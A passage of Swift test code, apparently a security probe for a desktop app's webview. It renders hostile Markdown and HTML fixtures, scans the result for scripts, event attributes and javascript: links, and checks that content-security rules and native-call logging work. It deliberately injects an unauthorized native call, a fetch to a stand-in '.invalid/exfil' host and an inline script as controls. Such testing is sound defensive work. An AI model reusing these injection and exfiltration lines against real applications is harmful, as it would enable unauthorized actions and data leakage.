          // 切入敌意窗口【前】先改阶段标记：条目 3 的 content 读取也计入敌意窗口
          window.__PHASE__ = 'hostile-window';
          if (typeof renderDetail === 'function') {
            state.sel = 3; state.pane = { mode: 'entry' }; renderDetail();
          }
          return JSON.stringify(phase1);
        })()
        """
        web.evaluateJavaScript(js) { result, error in
            let payload: [String: Any]
            if let json = result as? String, let d = try? JSONSerialization.jsonObject(with: json.data(using: .utf8)!) as? [String: Any] {
                payload = d
            } else { payload = ["measureError": error.map { String(describing: ($0 as NSError).userInfo) } ?? String(describing: result)] }
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.35) { self.measurePhase2a(payload) }
        }
    }

    // 阶段 2a：敌意窗口内——扫描 MD 条目，随即渲染 HTML 条目（其 content 异步取回）
    func measurePhase2a(_ prev: [String: Any]) {
        let js = """
        (function(){
          var aib = document.querySelector('.aibody');
          var codeEl = aib ? aib.querySelector('pre code') : null;
          window.__MD_SCAN__ = {
            aibodyPresent: !!aib,
            richClass: aib ? aib.classList.contains('rich') : false,
            headings: aib ? aib.querySelectorAll('h1').length : 0,
            bodyTextLen: aib ? (aib.textContent || '').length : -1,
            codeFencePresent: !!codeEl,
            codeFenceExact: codeEl ? codeEl.textContent === window.__EXPECTED_CODE__ : false,
            scriptTags: aib ? aib.querySelectorAll('script').length : -1,
            onAttrs: aib ? Array.prototype.filter.call(aib.querySelectorAll('*'), function(el){
              return el.getAttribute && (el.getAttribute('onerror') || el.getAttribute('onload') || el.getAttribute('onclick')); }).length : -1,
            styleAttrs: aib ? aib.querySelectorAll('[style]').length : -1,
            remoteImgs: aib ? Array.prototype.filter.call(aib.querySelectorAll('img'), function(el){
              return /^https?:/.test(el.getAttribute('src')||''); }).length : -1,
            jsLinks: aib ? Array.prototype.filter.call(aib.querySelectorAll('a'), function(el){
              return /^javascript:/i.test(el.getAttribute('href')||''); }).length : -1
          };
          state.sel = 5; state.pane = { mode: 'entry' }; renderDetail();
          return JSON.stringify({ mdScanDone: true });
        })()
        """
        web.evaluateJavaScript(js) { result, error in
            var payload = prev
            if let json = result as? String, let d = try? JSONSerialization.jsonObject(with: json.data(using: .utf8)!) as? [String: Any] {
                for (k, v) in d { payload[k] = v }
            } else {
                payload["measureError2a"] = error.map { String(describing: ($0 as NSError).userInfo) } ?? String(describing: result)
            }
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.35) { self.measurePhase2b(payload) }
        }
    }

    // 阶段 2b：敌意窗口内——扫描 HTML 条目 →（注入模式）制造违规 → 封闭结算 → 后续阶段
    func measurePhase2b(_ prev: [String: Any]) {
        let js = """
        (function(){
          \(Probe.jsInfoHelper)
          // --- HTML 敌意条目扫描（仍在 hostile-window 阶段） ---
          var aib = document.querySelector('.aibody');
          var strongEl = aib ? aib.querySelector('strong') : null;
          var hostileHtml = {
            aibodyPresent: !!aib,
            richClass: aib ? aib.classList.contains('rich') : false,
            bodyTextLen: aib ? (aib.textContent || '').length : -1,
            strongText: strongEl ? strongEl.textContent : null,
            pTags: aib ? aib.querySelectorAll('p').length : -1,
            scriptTags: aib ? aib.querySelectorAll('script').length : -1,
            imgTags: aib ? aib.querySelectorAll('img').length : -1,
            iframeTags: aib ? aib.querySelectorAll('iframe').length : -1,
            onAttrs: aib ? Array.prototype.filter.call(aib.querySelectorAll('*'), function(el){
              return el.getAttribute && (el.getAttribute('onerror') || el.getAttribute('onload') || el.getAttribute('onclick')); }).length : -1,
            styleAttrs: aib ? aib.querySelectorAll('[style]').length : -1,
            jsLinks: aib ? Array.prototype.filter.call(aib.querySelectorAll('a'), function(el){
              return /^javascript:/i.test(el.getAttribute('href')||''); }).length : -1,
            safeLinks: aib ? Array.prototype.filter.call(aib.querySelectorAll('a[href]'), function(el){
              return /^https?:/.test(el.getAttribute('href')||''); }).length : -1
          };
          window.__HTML_SCAN__ = hostileHtml;
          // --- 注入模式（必败负向控制；发生在敌意窗口内、封闭结算前） ---
          var injected = null;
          if ('\(injectMode)' === 'bridge') {
            // 未授权模拟原生调用：open_path 不在白名单；TAPI 桩本地返回，不执行真实命令
            try { TAPI.invoke('open_path', { path: '/private/tmp/nayan-v2-inject-marker' }); injected = 'bridge'; } catch (e) { injected = 'bridge-error:' + String(e); }
          } else if ('\(injectMode)' === 'transient') {
            // 瞬时外部尝试：img 同步插入即移除（记录先于移除）+ fetch 外部 URL。
            // 双保险不发真实请求：.invalid 保留域不可解析 + CSP connect-src/img-src 拦截。
            try {
              var im = document.createElement('img');
              im.src = 'https://nayan-v2.invalid/transient.png';
              document.body.appendChild(im);
              im.remove();
              fetch('https://nayan-v2.invalid/exfil').catch(function(){});
              injected = 'transient';
            } catch (e) { injected = 'transient-error:' + String(e); }
          }
          // --- 敌意窗口封闭结算（切走前；哨兵/树交互不可能再污染） ---
          var sealed = { native: [], net: [], unauthorized: [], external: [] };
          window.__PHASELOG__.native.forEach(function(e) {
            if (e.phase === 'hostile-window') {
              sealed.native.push(e);
              if (!window.__AUTHZ__(e)) sealed.unauthorized.push(e);
            }
          });
          window.__PHASELOG__.net.forEach(function(e) {
            if (e.phase === 'hostile-window') {
              sealed.net.push(e);
              if (window.__EXTERNAL_URL__(e.url)) sealed.external.push(e);
            }
          });
          window.__HOSTILE_SEALED__ = sealed;
          var fixtureCheck = {
            mdCanonicalLen: window.__HOSTILE_MD__.length,
            htmlCanonicalLen: window.__HOSTILE_HTML__.length,
            mdBodyTextLen: (window.__MD_SCAN__ || {}).bodyTextLen,
            htmlBodyTextLen: hostileHtml.bodyTextLen,
            htmlStrongExact: hostileHtml.strongText === window.__EXPECTED_STRONG__
          };
          // --- user-click：树交互 ---
          window.__PHASE__ = 'user-click';
          var tree = {}, iconPaths = {};
          try {
            tree.segButtons = document.querySelectorAll('#sbMode button').length;
            var projBtn = document.querySelectorAll('#sbMode button[data-m="proj"]')[0];
            if (projBtn) projBtn.click();
            tree.projModeActive = state.sbMode === 'proj';
            tree.projRows = document.querySelectorAll('.nav-item[data-projrow]').length;
            iconPaths.icwSlotsProbeToolAProjMode = document.querySelectorAll('.icw[data-ic-tool="probe-tool-a"]').length;   // 第四版：正文区改字母头像，多槽位只剩项目树（同一工具挂在两个项目下）
            var chev = document.querySelector('.pchev[data-tglk]');
            if (chev) chev.click();
            tree.foldToggled = !!(state.treeOpen && Object.keys(state.treeOpen).some(function(k){ return state.treeOpen[k] === false; }));
            var chev2 = document.querySelector('.pchev[data-tglk]');
            if (chev2) chev2.click();
            var toolBtn = document.querySelectorAll('#sbMode button[data-m="tool"]')[0];
            if (toolBtn) toolBtn.click();
            var toolRow = document.querySelector('.nav-item.tool[data-tool="probe-tool-a"]');
            if (toolRow) toolRow.click();
            tree.selectSetsView = !!(state.view && state.view.t === 'tool' && state.view.tool === 'probe-tool-a');
            iconPaths.icwSlotsProbeToolA = document.querySelectorAll('.icw[data-ic-tool="probe-tool-a"]').length;
            iconPaths.appIconCallsProbeToolA = window.__PHASELOG__.native.filter(function(e){ return e.cmd === 'app_icon' && e.name === 'probe-tool-a'; }).length;
            var emptySlot = document.querySelector('.icw[data-ic-tool="probe-tool-empty"]');
            iconPaths.emptySlotFallbackSvg = emptySlot ? emptySlot.querySelectorAll('svg').length : -1;
            iconPaths.emptySlotImg = emptySlot ? emptySlot.querySelectorAll('img').length : -1;
            iconPaths.cacheKeys = [];
            try { for (var i = 0; i < localStorage.length; i++) { var k = localStorage.key(i);
              if (k.indexOf('nayan-ic') === 0 || k.indexOf('nayan-own-icon') === 0) iconPaths.cacheKeys.push(k); } } catch(e) {}
          } catch (e) { tree.error = String(e); }
          // --- observer-controls：哨兵正向控制（观察器有效性；在敌意窗口封闭之后） ---
          var sentinel = null;
          if (\(sentinelMode ? "true" : "false")) {
            window.__PHASE__ = 'observer-controls';
            sentinel = {};
            try {
              window.__PWNED__ = false;
              var s = document.createElement('script'); s.textContent = 'window.__PWNED__=1';
              document.head.appendChild(s); s.remove();
              sentinel.inlineScriptBlocked = window.__PWNED__ === false;
              window.__PWNED__ = true;
              sentinel.pwnedReadout = window.__PWNED__ === true;
              TAPI.invoke('sentinel_native', {});
              sentinel.nativeCallLogged = window.__PHASELOG__.native.some(function(e){ return e.cmd === 'sentinel_native' && e.phase === 'observer-controls'; });
              var ri = document.createElement('img'); ri.src = 'https://evil.invalid/sentinel-keep.png';
              ri.setAttribute('data-sentinel', 'remote-img'); document.body.appendChild(ri);
              var st = document.createElement('span'); st.setAttribute('style', 'color:red');
              st.setAttribute('data-sentinel', 'style-attr'); document.body.appendChild(st);
              try { console.warn('nayan-sentinel-console'); } catch (e2) {}
              sentinel.remoteAndStylePlanted = true;
              // 网络记录器正向控制（fetch/img-src/dom 三路各注入一次；.invalid 不外发）
              try { fetch('https://nayan-sentinel.invalid/fetch-probe').catch(function(){}); } catch (e3) {}
              try { var si = new Image(); si.src = 'https://nayan-sentinel.invalid/img-probe.png'; } catch (e4) {}
              sentinel.netControlsPlanted = true;
            } catch (e) { sentinel.error = String(e); }
          }
          // --- teardown：恢复详情视图（截图用） ---
          window.__PHASE__ = 'teardown';
          if (typeof renderAll === 'function' && typeof state !== 'undefined') {
            state.view = { t: 'all' }; state.q = ''; state.sel = 1; state.pane = { mode: 'entry' };
            renderAll(true);
          }
          var body = document.body;
          var hostileFinal = { pwnedScript: !!window.__PWNED__, pwnedImg: !!window.__PWNED_IMG__,
            pwnedHtml: !!window.__PWNED_HTML__,
            scriptTagsInBody: body.querySelectorAll('script').length,
            onerrorNodes: Array.prototype.filter.call(body.querySelectorAll('*'), function(el){
              return el.getAttribute && (el.getAttribute('onerror') || el.getAttribute('onload')); }).length,
            styleAttrsInAibody: (function(){ var n=0;
              document.querySelectorAll('.aibody [style]').forEach(function(){ n++; }); return n; })(),
            remoteImgs: Array.prototype.filter.call(body.querySelectorAll('img'), function(el){
              return /^https?:/.test(el.getAttribute('src')||''); }).length };
          if (\(sentinelMode ? "true" : "false")) {
            hostileFinal.__sentinelViolationScriptSeen = window.__VIOLATIONS__.some(function(v){
              return String(v.directive||'').indexOf('script-src') === 0; });
            hostileFinal.__sentinelRemoteImgSeen = document.querySelectorAll('[data-sentinel="remote-img"][src^="http"]').length;
            hostileFinal.__sentinelStyleAttrSeen = document.querySelectorAll('[data-sentinel="style-attr"][style]').length;
            hostileFinal.__sentinelConsoleSeen = (window.__CONSOLES__ || []).some(function(c){ return c.indexOf('nayan-sentinel-console') >= 0; });
          }
          return JSON.stringify({
            hostileSealed: sealed,
            hostileInjected: injected,
            fixtureCheck: fixtureCheck,
            hostileDetail: window.__MD_SCAN__ || {},
            hostileHtmlDetail: hostileHtml,
            phaseNative: window.__PHASELOG__.native,
            phaseNativeTotal: window.__PHASELOG__.native.length,
            phaseNet: window.__PHASELOG__.net.slice(0, 120),
            phaseNetTotal: window.__PHASELOG__.net.length,
            phaseNetExternal: window.__PHASELOG__.net.filter(function(e){ return window.__EXTERNAL_URL__(e.url); }),
            phaseOrderSeen: (function(){ var seen = [];
              window.__PHASELOG__.native.concat(window.__PHASELOG__.net)
                .sort(function(a, b){ return a.seq - b.seq; })
                .forEach(function(e){ if (!seen.length || seen[seen.length - 1] !== e.phase) seen.push(e.phase); });
              return seen; })(),
            sentinel: sentinel,
            tree: tree,
            iconPaths: iconPaths,
            diag: { storedIconLen: (function(){ try { return (localStorage.getItem('nayan-own-icon-v2')||'').length; } catch(e) { return 'ERR:'+e.name; } })(),
                    brandHTML: ((document.querySelector('.brand .logo')||{}).innerHTML || '').replace(/data:image[^\"]+/g, '[image data omitted]'),
                    tapiType: typeof window.__TAURI__, hostileRendered: document.querySelectorAll('.aibody').length },
            icwFirst: info('.icw[data-ic-tool]') || info('.icw'),
            violations: window.__VIOLATIONS__ || [],
            consoles: (window.__CONSOLES__ || []).slice(0, 40),
            corruptImgControl: window.__CORRUPT_IMG__ || null,
            nativeCalls: window.__PHASELOG__.native.map(function(e){ return e.cmd + (e.name !== undefined ? ':' + e.name : ''); }).slice(0, 60),
            brandStyleApplied: (function(){ var i=document.querySelector('.brand .logo img');
              return i ? getComputedStyle(i).width === '24px' : null; })(),
            vendor: { markdownIt: typeof window.markdownit, DOMPurify: typeof window.DOMPurify },
            hostile: hostileFinal,
            navItems: document.querySelectorAll('.nav-item').length,
            effectiveCSPViaMeta: (document.querySelector('meta[http-equiv="Content-Security-Policy"]')||{}).content || null
          });
        })()
        """
        web.evaluateJavaScript(js) { result, error in
            var payload = prev
            if let json = result as? String, let d = try? JSONSerialization.jsonObject(with: json.data(using: .utf8)!) as? [String: Any] {
                for (k, v) in d { payload[k] = v }
            } else {
                payload["measureError"] = error.map { String(describing: ($0 as NSError).userInfo) } ?? String(describing: result)
            }
            self.finish(payload)
        }
    }

    func finish(_ payload: [String: Any]) {
        if let shot = screenshotPath {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.8) {
                self.web.evaluateJavaScript("(function(){ try { return JSON.stringify({ navItems: document.querySelectorAll('.nav-item').length, sideEmpty: !!document.querySelector('.side-empty'), sbMode: (typeof state!=='undefined'&&state.sbMode)||null, viewT: (typeof state!=='undefined'&&state.view&&state.view.t)||null, items: (typeof state!=='undefined'&&state.items&&state.items.length) ?? null, projListLen: (document.getElementById('projList')||{}).innerHTML.length }); } catch(e){ return JSON.stringify({diagErr:String(e)}); } })()") { diag, _ in
                    var extra = payload
                    if let s = diag as? String { extra["domAtSnapshot"] = s }
                    self.web.takeSnapshot(with: nil) { [weak self] image, error in
                        guard let self = self else { return }
                        if let img = image, let tiff = img.tiffRepresentation,
                           let rep = NSBitmapImageRep(data: tiff),
                           let png = rep.representation(using: .png, properties: [:]) {
                            try? png.write(to: URL(fileURLWithPath: shot))
                            extra["screenshot"] = ["path": shot, "bytes": png.count, "w": rep.pixelsWide, "h": rep.pixelsHigh]
                        } else {
                            extra["screenshotError"] = error.map { $0.localizedDescription } ?? "snapshot nil"
                        }
                        self.emit(extra, exitCode: nil)
                    }
                }
            }
        } else {
            emit(payload, exitCode: nil)
        }
    }

    func emit(_ extra: [String: Any], exitCode: Int?) {
        var out: [String: Any] = ["cspMode": cspMode, "csp": csp, "responseCSPHeader": csp, "iconPx": iconPx, "viewportWidth": viewportWidth, "darkTheme": darkTheme,
                                  "uiDir": uiDir.path, "scheme": "nayanprobe://（WKURLSchemeHandler）",
                                  "probeBuild": "P1-B06-VERIFY-02", "sentinelMode": sentinelMode, "injectMode": injectMode,
                                  "configSource": configSource,
                                  "cspInjection": ["scriptHash": scriptHash, "scriptHashSource": "index.html 最后一个内联 <script> 块（CRLF/CR→LF 归一后 sha256-base64，同 tauri-codegen）",
                                                   "styleNonce": "nayan-probe-style", "styleBlocksTotal": shared.styleBlocksTotal,
                                                   "nonceInjected": shared.nonceInjected, "inlineScriptBlocks": shared.inlineScriptBlocks],
                                  "iconDecode": ["main": iconDecodeMain, "corruptControl": iconDecodeCorrupt],
                                  "servedFiles": shared.servedFiles]
        for (k, v) in extra { out[k] = v }
        // ---- 门控（V1-F01/V1-F02：出现目标错误必须非零退出） ----
        var code = exitCode ?? 0
        let sealed = (out["hostileSealed"] as? [String: Any]) ?? [:]
        let unauth = (sealed["unauthorized"] as? [Any])?.count ?? -1
        let external = (sealed["external"] as? [Any])?.count ?? -1
        var gate: [String: Any] = ["hostileUnauthorized": unauth, "hostileExternal": external]
        if exitCode == nil {
            if injectMode == "bridge" {
                if unauth >= 1 {
                    gate["result"] = "GATE-FAIL-AS-DESIGNED（未授权原生调用被敌意窗口对账抓住）"
                    code = 7
                } else {
                    gate["result"] = "OBSERVER-BROKEN（注入未授权调用但敌意窗口未记录——观察器缺陷）"
                    code = 9
                }
            } else if injectMode == "transient" {
                if external >= 1 {
                    gate["result"] = "GATE-FAIL-AS-DESIGNED（瞬时外部网络尝试被记录器抓住，含已移除节点）"
                    code = 8
                } else {
                    gate["result"] = "OBSERVER-BROKEN（注入瞬时外部尝试但敌意窗口未记录——观察器缺陷）"
                    code = 9
                }
            } else {
                if unauth > 0 || external > 0 {
                    gate["result"] = "GATE-FAIL（敌意窗口出现未授权原生调用或外部网络尝试）"
                    code = 6
                } else if unauth < 0 || external < 0 {
                    gate["result"] = "GATE-INDeterminate（hostileSealed 缺失——测量未完成？）"
                    code = 6
                } else {
                    gate["result"] = "PASS（敌意窗口零未授权调用/零外部尝试）"
                }
            }
        }
        out["gate"] = gate
        let data = try! JSONSerialization.data(withJSONObject: out, options: [.prettyPrinted, .sortedKeys])
        if let p = outJson { try? data.write(to: URL(fileURLWithPath: p)) }
        print(String(data: data, encoding: .utf8)!)
        exit(Int32(code))
    }
}

let app = NSApplication.shared
let probe = Probe()
DispatchQueue.main.async { probe.run() }
app.run()
